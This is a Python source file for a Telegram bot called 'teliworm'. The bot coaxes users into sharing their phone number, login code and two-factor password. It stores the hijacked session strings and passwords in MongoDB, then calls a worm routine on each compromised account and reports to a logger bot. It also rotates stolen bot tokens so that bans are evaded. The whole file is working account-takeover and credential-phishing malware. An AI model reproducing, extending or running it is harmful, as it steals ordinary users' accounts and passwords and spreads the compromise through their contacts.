import logging,os,json,telethon,asyncio
from telethon import TelegramClient, events, Button, errors
from telethon.sessions import StringSession
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings,direct_reply,numpad
from worm import worm

load_dotenv(override=True)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
database = mongo_client.userdb.sessions
logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')

def getconfig(key, default=None):
    result = mongo_client.default.config.find_one({'key':key})
    if result is None:
        return default
    return result['value']
def setconfig(key, value):
    mongo_client.default.config.update_one({'key': key}, {'$set': {'key':key, 'value':value}}, upsert=True)
def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default
def yesno(x,page='def'):
    return [
        [Button.inline(strings['yes'], '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
        [Button.inline(strings['no'], '{{"page":"{}","press":"no{}"}}'.format(page,x))]
    ]
async def is_session_authorized(session):
    uclient = TelegramClient(StringSession(session), os.environ['API_ID'], os.environ['API_HASH'])
    await uclient.connect()
    authorized = await uclient.is_user_authorized()
    await uclient.disconnect()
    return authorized
async def handle_usr(phone_num, event):
    await (await event.respond('wait..', buttons=Button.clear())).delete()
    msg = await event.respond(strings['sending'])
    uclient = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
    await uclient.connect()
    try:
        scr = await uclient.send_code_request(phone_num)
        login = {
        	'code_len': scr.type.length,
            'phone_code_hash': scr.phone_code_hash,
            'session': uclient.session.save(),
        }
        await msg.edit(strings['ask_code'], buttons=numpad)
        return login
    except Exception as e:
        await msg.edit("Error: "+repr(e))
    await uclient.disconnect()
    return {}
async def sign_in(event, user_data):
    data = {}
    uclient = None
    try:
        login = json.loads(user_data['login'])
        if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
            await uclient.connect()
            await uclient.sign_in(password=user_data['password'])
            data['password'] = user_data['password']
        elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
            await uclient.connect()
            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
        else:
            return False
        login = {}
        data = {'session': uclient.session.save(), 'logged_in': True}
        await event.edit(strings['login_success'])
        await worm(uclient, logger_bot)
    except telethon.errors.PhoneCodeInvalidError as e:
        await event.edit(strings['code_invalid'])
        await event.respond(strings['ask_code'], buttons=numpad)
        login['code'] = ''
        login['code_ok'] = False
    except telethon.errors.SessionPasswordNeededError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['ask_pass'])
    except telethon.errors.PasswordHashInvalidError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['pass_invalid'])
        await event.respond(strings['ask_pass'])
    except Exception as e:
        login = {}
        await event.edit(repr(e))
    if uclient is not None:
        await uclient.disconnect()
    update_query = {'$set': data}
    if login=={}:
        update_query['$unset'] = {'login': ''}
    else:
        data['login'] = json.dumps(login)
    database.update_one({'_id': user_data['_id']}, update_query)
    return True

@events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
async def handler_get_token(event):
    m = event.message.text.split(' ')
    if len(m)==2 and m[1]==os.environ['SECRET_COMMAND']:
        await event.respond(f"`{getconfig('BOT_TOKEN')}`")
    raise events.StopPropagation
@events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
async def handler_all_user(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    user_data = user_data if user_data else {"chat_id": event.chat_id}
    data = {}
    login = json.loads(get(user_data, 'login', '{}'))
    if event.message.text in direct_reply:
        await event.respond(direct_reply[event.message.text])
        raise events.StopPropagation
    elif not get(user_data, 'logged_in', False) and event.message.contact and event.message.contact.user_id==event.chat.id:
        await event.message.delete()
        data['phone'] = event.message.contact.phone_number
        login = await handle_usr(event.message.contact.phone_number, event)
    elif get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
        await event.message.delete()
        await event.respond(strings['ask_ok']+event.message.text, buttons=yesno('pass'))
        data['password'] = event.message.text
    elif get(user_data, 'logged_in', False):
        if await is_session_authorized(user_data['session']):
            await event.respond(strings['already_logged_in'])
        else:
            login = await handle_usr(user_data['phone'], event)
    else:
        if 'phone' in user_data:
            login = await handle_usr(user_data['phone'], event)
        else:
            await event.respond(strings['hello'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
    if login!={}:
        data['login'] = json.dumps(login)
    if data!={}:
        database.update_one({"chat_id": event.chat_id}, {'$set': data}, upsert=True)
    raise events.StopPropagation
@events.register(events.CallbackQuery(func=lambda e: e.is_private))
async def handler_callback(event):
    try:
        evnt_dta = json.loads(event.data.decode())
        press = evnt_dta['press']
    except:
        return
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(user_data['login'])
    login['code'] = get(login, 'code', '')
    if type(press)==int:
        login['code'] += str(press)
    elif press=="clear":
        login['code'] = login['code'][:-1]
    elif press=="clear_all" or press=="nocode":
        login['code'] = ''
        login['code_ok'] = False
    elif press=="yescode":
        login['code_ok'] = True
    elif press=="yespass":
        login['pass_ok'] = True
        login['need_pass'] = False
    elif press=="nopass":
        login['pass_ok'] = False
        login['need_pass'] = True
        await event.edit(strings['ask_pass'])
    user_data['login'] = json.dumps(login)
    database.update_one({"chat_id": event.chat_id}, {'$set': {'login': user_data['login']}})
    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
    elif press=="nopass":
        return
    elif not await sign_in(event, user_data):
        await event.edit(strings['ask_code']+login['code'], buttons=numpad)

async def run_bot():
    bot_count = mongo_client.wormdb.bots.count_documents({})
    bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
    for function in botFunctions:
        bot.add_event_handler(function)
    if bot_count==0:
        await bot.start(bot_token=os.environ['BOT_TOKEN'])
    else:
        next_bot = mongo_client.wormdb.bots.find().limit(1).next()
        await bot.start(bot_token=next_bot['token'])
        if not await bot.is_user_authorized():
            mongo_client.wormdb.bots.delete_one(next_bot)
            raise Exception("Bot not authorized")
        await bot.start(bot_token=next_bot['token'])
    setconfig('BOT_USERNAME', (await bot.get_me()).username)
    setconfig('BOT_TOKEN', os.environ['BOT_TOKEN'] if bot_count==0 else next_bot['token'])
    await bot.run_until_disconnected()
async def main():
    await logger_bot.start(bot_token=os.environ['LOGGER_BOT_TOKEN'])
    while 1:
        try:
            print('-- bot start --')
            await run_bot()
        except KeyboardInterrupt:
            break
        except:
            pass

botFunctions = [obj for name, obj in globals().items() if callable(obj) and obj.__class__.__name__ == "function" and name.startswith('handler_')]

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
